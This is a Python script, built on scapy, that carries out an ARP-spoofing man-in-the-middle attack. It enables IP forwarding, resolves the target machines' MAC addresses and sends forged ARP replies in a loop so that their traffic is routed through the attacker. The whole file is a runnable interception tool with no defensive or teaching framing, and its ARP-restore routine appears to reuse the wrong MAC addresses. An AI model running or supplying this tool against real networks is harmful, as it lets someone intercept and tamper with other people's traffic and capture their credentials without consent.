import os
import sys
import time
from scapy.all import *


class MITMAttack:

    def __init__(self, interface, target_ips):
        self.interface = interface
        self.target_ips = target_ips

    def get_input(self):
        try:
            self.interface = input("[*] Enter Interface: ")
            num_ips = int(input("[*] Enter the number of target IPs: "))
            for i in range(num_ips):
                ip = input(f"[*] Enter Target IP {i + 1}: ")
                self.target_ips.append(ip)
        except KeyboardInterrupt:
            print("\n[*] User Requested Shutdown")
            print("[*] Exiting...")
            sys.exit(1)

    def enable_ip_forwarding(self):
        print("\n[*] Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        for ip in self.target_ips:
            victimMAC = self.get_mac(ip)
            send(ARP(op=2, pdst=ip, psrc=self.target_ips[(self.target_ips.index(ip) + 1) % len(self.target_ips)], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
        print("\n[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self, targetMACs):
        for i, ip in enumerate(self.target_ips):
            send(ARP(op=2, pdst=self.target_ips[(i + 1) % len(self.target_ips)], psrc=ip, hwdst=targetMACs[i]))

    def mitm(self):
        try:
            targetMACs = [self.get_mac(ip) for ip in self.target_ips]
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find MAC Address(es)")
            print("[!] Exiting...")
            sys.exit(1)
        print("[*] Poisoning Targets...")
        print("[*] Use CTRL+C to stop")
        print("[*] Targets poisoned: ")
        for i, ip in enumerate(self.target_ips):
            print(f"[*]  {ip} - {targetMACs[i]}")
        while True:
            try:
                self.trick(targetMACs)
                time.sleep(1.5)
            except KeyboardInterrupt:
                self.reARP()
                break

def print_usage():
    print('Usage: python main.py -i <interface> -t "<target_ip1> <target_ip2> ..."')
def main(argv):
    interface = None
    target_ips = []
    for i in range(len(argv)):
        if argv[i] == "-i":
            interface = argv[i + 1]
        elif argv[i] == "-t":
            target_ips = argv[i + 1].split(" ")
    if interface is None:
        print("Interface not specified")
        print_usage()
        sys.exit(1)
    elif len(target_ips) == 0:
        print("Target IPs not specified")
        print_usage()
        sys.exit(1)


    print(f"Interface: {interface}")
    print(f"Target IPs: {target_ips}")
    attack = MITMAttack(interface, target_ips)
    attack.enable_ip_forwarding()
    attack.mitm()



if __name__ == "__main__":
    #attack = MITMAttack()
    #attack.enable_ip_forwarding()
    #attack.mitm()
    main(sys.argv[1:])
